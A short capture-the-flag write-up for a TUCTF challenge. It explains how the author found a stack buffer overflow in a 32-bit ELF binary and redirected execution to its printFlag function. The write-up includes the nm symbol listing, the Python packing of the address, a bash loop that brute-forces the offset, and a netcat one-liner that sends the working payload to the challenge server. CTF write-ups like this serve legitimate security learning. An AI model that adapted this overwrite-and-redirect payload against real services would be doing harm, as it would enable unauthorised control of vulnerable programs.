bby's first elf
==============

I played with the binary for a little bit and then saw it was a clear buffer overflow, especially considering the hint that it suggested: "Do you feel the flow?"

The buffer seemed too small to try and fit any shellcode in it, so I figured it had some function to give us the flag or grant us a shell in the binary itself. To verify, I ran the [`nm`][nm] command to see all the functions it had.

```
...
08049f10 d __JCR_END__
08049f10 d __JCR_LIST__
         w _Jv_RegisterClasses
08048680 T __libc_csu_fini
08048610 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
080485c9 T main
0804856d T printFlag
         U puts@@GLIBC_2.0
080484e0 t register_tm_clones
08048470 T _start
0804a040 B stdout@@GLIBC_2.0
0804a034 D __TMC_END__
080484a0 T __x86.get_pc_thunk.bx
...
```

I could see it very clearly had a function called `printFlag`, so all we had to do was jump to that memory address. First we converted it into something [Python] could output:

``` python
>>> import struct
>>> struct.pack('<I', 0x0804856d)
'm\x85\x04\x08'
```

Then we could start to hammer the thing with offsets and try and get the flag. I was honestly feeling lazy so I brute-forced this:

```
for i in {15..30}; do echo `python -c "print 'A'*$i + 'm\x85\x04\x08'"`| nc 146.148.95.248 2525; done
``

Then I found the flag. Here's a good one-liner:

```
echo `python -c "print 'A'*24 + 'm\x85\x04\x08'"`| nc 146.148.95.248 2525|grep "TUCTF" --color=none
```